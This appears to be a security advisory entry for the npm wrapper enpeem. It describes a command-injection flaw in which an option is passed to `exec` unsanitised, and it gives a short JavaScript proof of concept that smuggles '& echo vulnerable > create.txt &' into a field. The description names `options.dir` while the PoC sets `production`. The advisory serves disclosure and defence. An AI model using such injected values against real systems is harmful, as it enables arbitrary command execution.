  title: Command Injection
  description: |
    [enpeem][1] is a lightweight wrapper for accessing npm programmatically
    (alternative to adding `npm` as a dependency)

    Affected versions of this package are vulnerable to Command Injection.
    The `options.dir` argument is provided to the `exec` function without
    any sanitization.

    ### PoC By JHU System Security Lab   {#poc-by-jhu-system-security-lab}

        var root = require("enpeem");
        var attack_code = "& echo vulnerable > create.txt &";
        var opts = {
          "production": attack_code
        }
        root.update(opts, function(){});
